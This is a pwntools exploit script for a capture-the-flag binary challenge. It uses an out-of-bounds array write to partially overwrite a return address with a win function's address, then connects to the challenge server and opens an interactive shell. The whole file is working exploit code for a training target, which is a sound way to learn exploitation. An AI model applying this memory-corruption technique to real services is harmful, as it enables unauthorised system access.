'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    exp: array out of bound
1. determine the offset of array to rsp+8
2. write the low 12 bits of [rsp+8] to win_addr
'''

from pwn import *


local = 0
url, port = "0.cloud.chals.io", 16612
filename = "./pwnme"
elf = ELF(filename)
# libc = ELF("./libc.so.6") 
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

def B():
    gdb.attach(io)
    pause()

win_addr = 0x0000000000001345
win_low_12_bits = 0x345

def pwn():
    while True:
        try:
            if local:
                context.log_level = "debug"
                io = process(filename)
                context.terminal = ['tmux', 'splitw', '-h']
                # gdb.attach(io)
            else:
                context.log_level = "debug"
                io = remote(url, port)

            io.sendlineafter(b'Write-What-Where:\n\n', b'60')
            io.sendline(str(win_low_12_bits).encode())
            
            io.sendline(b'ls')
            response = io.recvline(timeout=1)
            if response: return io
        except Exception as e:
            print(f"[*] Exception: {e}")
            io.close()


if __name__ == "__main__":
    io = pwn()
    io.interactive()
